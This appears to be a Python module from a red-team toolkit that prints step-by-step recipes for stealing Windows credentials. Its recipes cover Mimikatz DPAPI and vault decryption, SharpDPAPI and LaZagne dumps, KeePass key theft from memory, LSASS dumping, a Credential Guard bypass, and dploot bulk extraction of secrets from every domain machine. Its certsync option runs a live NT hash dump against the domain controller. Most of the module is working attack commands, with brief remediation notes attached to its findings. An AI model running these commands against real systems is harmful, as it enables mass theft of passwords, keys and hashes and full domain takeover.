"""
Module: DPAPI & Credential Vault
Techniques: Credential Manager, DPAPI masterkey/RPC, SharpDPAPI,
            LaZagne, KeeThief, ts::mstsc, certsync, Pass-the-Challenge
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("DPAPI & CREDENTIAL VAULT")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  [1]  List Credential Manager Blobs
  [2]  Decrypt DPAPI Blob (masterkey via RPC)
  [3]  SharpDPAPI — Machine Credentials/Vaults
  [4]  SharpDPAPI — User Keys with domain backup key
  [5]  LaZagne — All credentials
  [6]  KeePass extraction (KeeThief)
  [7]  RDP Saved Credentials (ts::mstsc)
  [8]  certsync — NT hashes via PKINIT
  [9]  Pass-the-Challenge (Credential Guard bypass)
  [10] dploot — Remote DPAPI Bulk Extraction      (domain backup key → ALL secrets)
  [11] impacket-dpapi — Linux-side DPAPI decrypt
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {Y}List DPAPI Credential Blobs (Mimikatz):{RST}

  Invoke-Mimikatz -Command '"vault::list"'
  Invoke-Mimikatz -Command '"vault::cred /patch"'

  {Y}Blob locations:{RST}
  C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Credentials\\
  C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Credentials\\
""")

    elif c == "2":
        blob = prompt("Credential blob full path")
        print(f"""
  {Y}Step 1 — Get masterkey GUID from blob:{RST}
  Invoke-Mimikatz -Command '"dpapi::cred /in:{blob}"'
  # Note the guidMasterKey value

  {Y}Step 2 — Fetch masterkey from DC via RPC (domain user needed):{RST}
  Invoke-Mimikatz -Command '"dpapi::masterkey /in:C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\<GUID> /rpc"'

  {Y}Step 3 — Decrypt the credential blob:{RST}
  Invoke-Mimikatz -Command '"dpapi::cred /in:{blob} /masterkey:<hex_key>"'
""")

    elif c == "3":
        print(f"""
  {Y}SharpDPAPI (requires elevated context):{RST}

  .\\SharpDPAPI.exe machinecredentials
  .\\SharpDPAPI.exe machinevaults
  .\\SharpDPAPI.exe machinetriage      # all machine DPAPI data
""")

    elif c == "4":
        pvk = prompt("Domain backup key .pvk file")
        print(f"""
  {Y}SharpDPAPI with domain backup key:{RST}

  # Get domain backup key first (DA required):
  .\\SharpDPAPI.exe backupkey /server:{dc} /file:key.pvk

  # Decrypt user masterkeys:
  .\\SharpDPAPI.exe masterkeys /pvk:{pvk}

  # Decrypt credential blobs with recovered keys:
  .\\SharpDPAPI.exe credentials {{<GUID>}}:<masterkey_hex>
  .\\SharpDPAPI.exe triage           # decrypt all available
""")
        add_finding("DPAPI Domain Backup Key", "Critical",
                    "Domain DPAPI backup key retrieved — all user secrets decryptable",
                    "Protect domain backup key; rotate if compromised")

    elif c == "5":
        print(f"""
  {Y}LaZagne — extract all stored credentials:{RST}

  .\\lazagne.exe all                  # everything
  .\\lazagne.exe browsers             # browser saved passwords
  .\\lazagne.exe windows              # Windows credential stores
  .\\lazagne.exe mails                # email clients
  .\\lazagne.exe databases            # DB connection strings
  .\\lazagne.exe sysadmin             # PuTTY, WinSCP, Filezilla
""")

    elif c == "6":
        print(f"""
  {Y}KeeThief — extract KeePass master key from memory:{RST}

  Import-Module KeeThief.ps1
  Get-KeePassDatabaseKey -Verbose

  {Y}ThievingFox (inject into processes, more powerful):{RST}
  # Supports KeePass, 1Password, BitWarden, Dashlane etc.
  python3 ThievingFox.py install --target <target>
  python3 ThievingFox.py collect --target <target>
  python3 ThievingFox.py cleanup --target <target>
""")

    elif c == "7":
        print(f"""
  {Y}RDP Saved Credentials (Mimikatz):{RST}

  # Extract from RDP client (connecting machine)
  Invoke-Mimikatz -Command '"ts::mstsc"'

  # Extract from RDP server (target machine)
  Invoke-Mimikatz -Command '"ts::logonpasswords"'

  {Y}Veeam Backup credentials:{RST}
  .\\SharpVeeamDecryptor.exe

  {Y}Windows Vault via CrackMapExec:{RST}
  crackmapexec smb {dc} -u {user} -p '{pw}' -M vnc
""")

    elif c == "8":
        info("certsync — retrieve ALL domain NT hashes via PKINIT (no DCSync needed):")
        run_cmd(f"certsync -u {user} -p '{pw}' -d {dom} -dc-ip {dc}")
        pfx = prompt("CA .pfx if already obtained (blank to skip)")
        if pfx:
            run_cmd(f"certsync -u {user} -p '{pw}' -d {dom} -dc-ip {dc} -ca-pfx {pfx}")
        add_finding("certsync — NT Hash Dump", "Critical",
                    "All domain NT hashes retrieved via PKINIT (no DS-Replication rights needed)",
                    "Protect CA private key; restrict certificate enrollment; monitor PKINIT anomalies")

    elif c == "9":
        print(f"""
  {Y}Pass-the-Challenge — bypass Credential Guard:{RST}

  Step 1: Dump LSASS process memory
    procdump.exe -accepteula -ma <lsass_PID> lsass.dmp
    # or: tasklist /fi "imagename eq lsass.exe" → get PID

  Step 2: Parse dump with pypykatz
    python3 -m pypykatz lsa minidump lsass.dmp -p msv

  Step 3: Inject PassTheChallenge security package
    .\\PassTheChallenge.exe inject .\\SecurityPackage.dll

  Step 4a — NTLMv1 (get NT hash):
    .\\PassTheChallenge.exe nthash <context>:<proxy> <encrypted_blob>
    # Submit to crack.sh for fast cracking

  Step 4b — NTLMv2 (relay challenge):
    .\\PassTheChallenge.exe challenge <context>:<proxy> <blob> <challenge>
    # Paste the NTLM response back into impacket prompt
    psexec.py 'domain/user:CHALLENGE@target'
""")

    elif c == "10":
        out_dir = prompt("Output directory [/tmp/dploot_out]") or "/tmp/dploot_out"
        pvk     = prompt("Domain backup key .pvk (blank = auto-retrieve if DA)")
        print(f"""
  {NEON_CYN}dploot — Remote DPAPI Bulk Extraction (all machines, all users):{RST}

  {DIM}dploot can extract DPAPI secrets from ALL domain machines using the
  domain backup key — credentials, browser passwords, certificates, WiFi keys,
  SCCM NAA credentials, and more. No agent needed — pure SMB/LDAP.{RST}

  ── Step 1: Retrieve domain DPAPI backup key (requires DA) ────────────────
  dploot backupkey -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -export-pk /tmp/backupkey.pvk

  # Alternative (impacket):
  impacket-dpapi backupkeys --export -t {dom}/{user}:'{pw}'@{dc}

  ── Step 2a: Triage all machines (find juicy DPAPI data) ─────────────────
  dploot triage -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    {f"-pvk {pvk}" if pvk else "-pvk /tmp/backupkey.pvk"} \\
    -o {out_dir}

  ── Step 2b: Dump credentials from all domain machines ────────────────────
  dploot credentials -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -pvk /tmp/backupkey.pvk -o {out_dir}

  ── Step 2c: Dump browser passwords (Chrome/Edge/Firefox) ────────────────
  dploot browsers -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -pvk /tmp/backupkey.pvk -o {out_dir}

  ── Step 2d: Dump certificates ───────────────────────────────────────────
  dploot certificates -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -pvk /tmp/backupkey.pvk -o {out_dir}

  ── Step 2e: Dump SCCM NAA credentials ───────────────────────────────────
  dploot sccm -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -pvk /tmp/backupkey.pvk -o {out_dir}

  ── Step 2f: Dump WiFi keys ───────────────────────────────────────────────
  dploot wifi -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -pvk /tmp/backupkey.pvk -o {out_dir}

  ── Step 3: Target specific machine ───────────────────────────────────────
  dploot triage -d {dom} -u '{user}' -p '{pw}' -t {dc} \\
    -pvk /tmp/backupkey.pvk -o {out_dir}

  {NEON_CYN}All-in-one (auto-retrieve backup key + triage all): ─────────────{RST}
  dploot triage -d {dom} -u '{user}' -p '{pw}' -dc-ip {dc} \\
    -auto-backupkey -o {out_dir}

  {DIM}• dploot: github.com/zblurx/dploot
  • Works with PTH: replace -p with -H <nt_hash>
  • Output includes plaintext passwords, PFX certs, SCCM NAA creds{RST}
""")
        add_finding("DPAPI Bulk Extraction (dploot)", "Critical",
                    f"Domain DPAPI backup key used to decrypt all user secrets across all machines in {dom}",
                    "Protect domain backup key (rotate after any DA compromise); monitor bulk SMB access to DPAPI blob paths; restrict admin shares")

    elif c == "11":
        blob_path = prompt("DPAPI blob path (e.g. /tmp/cred_blob)")
        mk_path   = prompt("Masterkey path or hex")
        print(f"""
  {NEON_CYN}impacket-dpapi — Linux-side DPAPI Decryption:{RST}

  ── Get domain backup key ─────────────────────────────────────────────────
  impacket-dpapi backupkeys --export -t {dom}/{user}:'{pw}'@{dc}
  # Saves: key_export.pvk  (domain backup key)

  ── Decrypt masterkey with backup key ────────────────────────────────────
  impacket-dpapi masterkey \\
    -file '{mk_path}' \\
    -pvk key_export.pvk
  # Output: decrypted masterkey hex

  ── Decrypt credential blob ───────────────────────────────────────────────
  impacket-dpapi credential \\
    -file '{blob_path}' \\
    -key <decrypted_masterkey_hex>

  ── Decrypt vault credential ──────────────────────────────────────────────
  impacket-dpapi vault \\
    -file /path/to/.vcrd \\
    -key <masterkey_hex>

  ── Decrypt Chrome/Edge cookies + passwords ───────────────────────────────
  impacket-dpapi chrome \\
    --local-state /tmp/Local\\ State \\
    --cookies /tmp/Cookies \\
    -key <masterkey_hex>

  ── Full offline workflow (no DA needed if you have backup key) ───────────
  # 1. Copy from target (via SMB or dploot):
  #    C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\<GUID>  (masterkey)
  #    C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Credentials\\<blob>     (credential)
  # 2. Decrypt masterkey with backup key (above)
  # 3. Decrypt credential blob with masterkey
""")

    pause()
